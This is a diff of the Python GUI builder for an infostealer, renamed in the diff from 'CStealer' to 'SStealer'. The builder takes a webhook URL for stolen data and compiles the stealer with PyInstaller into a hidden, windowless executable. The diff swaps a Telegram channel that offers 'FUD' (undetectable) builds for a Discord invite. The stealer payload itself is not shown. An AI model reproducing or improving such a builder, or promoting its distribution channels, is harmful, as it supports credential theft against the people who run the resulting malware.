@@ -5,7 +5,7 @@ from tkinter import messagebox, filedialog
 
 ctk.set_appearance_mode("dark")
 app = ctk.CTk()
-app.title(f"CStealer Builder ~ Version 1.3")
+app.title(f"SStealer Builder ~ Version 2.1")
 app.iconbitmap("CStealer_assets\\img\\logo.ico")
 app.geometry("400x240")
 app.resizable(False, False)
@@ -59,7 +59,7 @@ def build_exe():
         else:
             icon_option = ''
 
-        message = "Build process started. This may take a while...\nBuilded file won't be undetected (FUD)\nYou can get FUD from Telegram channel - t.me/cservicess"
+        message = "Build process started. This may take a while...\nBuilded file won't be undetected (FUD)\nYou can get discord - https://discord.gg/shhhgen "
         messagebox.showinfo("Information", message)
 
         # Customizing PyInstaller build command
@@ -67,11 +67,11 @@ def build_exe():
         build_command = f'python -m PyInstaller cstealer.py --noconsole --onefile{icon_option}'
         os.system(build_command)
 
-        messagebox.showinfo("Build Success", "Build process completed successfully.\nDon't forget to star the repo and join Telegram channel to support and receive lastest updates!")
+        messagebox.showinfo("Build Success", "Build process completed successfully.\nDon't forget to star the repo and join discord server to support and receive lastest updates!")
     else:
         messagebox.showerror("Error", "Invalid webhook URL!")
 
-label = ctk.CTkLabel(master=app, text="CStealer", text_color=("white"), font=("Helvetica", 26))
+label = ctk.CTkLabel(master=app, text="SStealer", text_color=("white"), font=("Helvetica", 26))
 label.place(relx=0.5, rely=0.2, anchor=ctk.CENTER)
 
 entry = ctk.CTkEntry(master=app, width=230, height=30, placeholder_text="Enter your webhook")
